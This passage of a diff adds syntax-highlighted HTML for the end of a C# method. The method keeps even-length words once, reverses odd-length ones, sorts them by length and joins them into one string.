+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">%</span> <span class="normal">2</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">)</span> <span class="comment"><span class="special-char">//</span> Even length, add it if not seen before</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="special-char">!</span><span class="normal">seenEvenWords</span><span class="special-char">.</span><span class="method">Contains</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">seenEvenWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">transformedWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span> <span class="comment"><span class="special-char">//</span> Odd length, reverse the word</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">transformedWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="decl">new</span> <span class="decl">string</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="method">Reverse</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">ToArray</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                <br /><span class="line"></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span> Sort the words by length</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">transformedWords</span><span class="special-char">.</span><span class="method">Sort</span><span class="special-char">(</span><span class="special-char">(</span><span class="normal">x</span><span class="special-char">,</span> <span class="normal">y</span><span class="special-char">)</span> <span class="special-char">=</span><span class="special-char">&gt;</span> <span class="normal">x</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">.</span><span class="method">CompareTo</span><span class="special-char">(</span><span class="normal">y</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line"></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span> Join the words into a single string</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="decl">string</span><span class="special-char">.</span><span class="method">Join</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span> <span class="special-char">"</span></span><span class="special-char">,</span> <span class="normal">transformedWords</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span> </span>
+                                <br /><span class="line"><span class="special-char">}</span></span>
+                            </code>
+                        </p>
                     </div>
+                </div>
             </section>
         </div>
     </div>
